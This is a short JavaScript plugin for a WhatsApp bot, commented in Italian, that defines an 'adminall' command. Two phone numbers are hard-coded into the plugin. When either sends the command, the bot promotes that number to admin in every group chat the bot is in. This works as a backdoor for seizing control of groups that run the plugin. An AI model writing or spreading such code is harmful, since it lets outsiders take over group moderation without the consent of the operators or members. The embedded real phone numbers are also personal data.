//Plugin by Gab, Lucifero & 333 staff

let handler = async (m, { conn }) => {
  const numeriAutorizzati = [
    '212688151945@s.whatsapp.net',
    '393508337404@s.whatsapp.net'
  ];

  if (!numeriAutorizzati.includes(m.sender)) {
    await conn.sendMessage(m.chat, { text: '⚠️ Solo i numeri autorizzati possono utilizzare questo comando!' });
    return;
  }

  if (m.fromMe) return;

  let chats = Object.keys(conn.chats).filter(jid => jid.endsWith('@g.us'));

  let failed = [];
  for (let jid of chats) {
    try {
      await conn.groupParticipantsUpdate(jid, [m.sender], "promote");
    } catch (e) {
      console.error(`Errore nel gruppo ${jid}:`, e);
      failed.push(jid);
    }
  }

  let successCount = chats.length - failed.length;
  
  await conn.sendMessage(m.chat, { 
    text: `Fatto! Sei stato promosso in ${successCount} gruppi.`
  });

  if (failed.length) {
    await conn.sendMessage(m.sender, { 
      text: `Non sono riuscito a promuoverti in questi gruppi: ${failed.join(', ')}` 
    });
  }
};
handler.help = ['𝐚𝐝𝐦𝐢𝐧𝐚𝐥𝐥'];
handler.tags = ['owner']
handler.command = /^adminall$/i;
handler.gab= true;
handler.group = true;
handler.botAdmin = true;
export default handler;